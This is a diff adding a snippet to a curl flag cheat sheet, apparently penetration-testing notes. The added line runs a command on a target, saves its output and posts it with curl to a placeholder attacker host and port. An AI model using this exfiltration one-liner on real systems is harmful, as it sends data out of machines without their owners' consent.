@@ -26,3 +26,14 @@ eg. `curl -X GET http://127.0.0.1:5984/`
 | `--upload-file <filepath>` | upload a file - use with POST                                                                                                                                      |
 | `-O`                       | save downloaded file using original filename                                                                                                                       |
 | `-o <path>`                | save file at path                                                                                                                                                  |
+
+# Snippets
+
+## Send command output using curl
+
+Helpful for troubleshooting payloads / commands on targets without a proper shell.
+
+1. write output to file
+2. send file contents with curl
+
+ `<command> &> /tmp/output; curl --data @/tmp/output http://<ip>:<port>/`
